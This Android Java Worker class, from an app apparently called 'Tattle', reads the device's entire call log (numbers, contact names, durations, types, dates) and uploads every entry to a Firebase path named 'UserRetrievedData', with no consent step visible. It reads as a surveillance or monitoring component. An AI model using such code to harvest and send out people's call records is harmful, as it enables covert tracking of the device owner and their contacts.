package com.globalsolutions.Tattle.DataUploadServices;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.globalsolutions.Tattle.Models.CallLogModel;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallLogUploadService extends Worker {
    Context context;
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    SharedPrefs sharedPrefs;

    public CallLogUploadService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {

        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();

        databaseReference = firebaseDatabase.getReference();

        String stringOutput = "";

        Uri uriCallLogs = Uri.parse("content://call_log/calls");
        Cursor cursorCallLogs = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            cursorCallLogs = context.getContentResolver().query(uriCallLogs, null, null, null);
            cursorCallLogs.moveToFirst();

            do {
                String stringNumber = cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.NUMBER));
                String stringName = cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String stringDuration = cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.DURATION));
                String stringType = cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.TYPE));
                String stringDate = cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.DATE));

                String type = null;
                int dircode = Integer.parseInt( stringType );
                switch( dircode ) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        type = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        type = "MISSED";
                        break;
                }

                DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");

                // Creating date from milliseconds
                // using Date() constructor
                Date result = new Date(Long.parseLong(stringDate));

                stringOutput = stringOutput + "Number: " + stringNumber
                        + "\nName: " + stringName
                        + "\nDuration: Seconds " + stringDuration
                        + "\n Type: " + type
                        + "\n Date: "+ simple.format(result)
                        + "\n\n";

                CallLogModel callLog = new CallLogModel(stringNumber, type, simple.format(result), stringDuration, stringName);
                uploadCallLog(callLog);

            } while (cursorCallLogs.moveToNext());

        }
        Data outputData = new Data.Builder().putBoolean("callLogsSyncedWithServer", true).build();
        return Result.success(outputData);
    }

    public void uploadCallLog(CallLogModel callLogModel) {
        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("CallLogs").child(callLogModel.getDate()).setValue(callLogModel).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void aVoid) {
            }
        });
    }
}
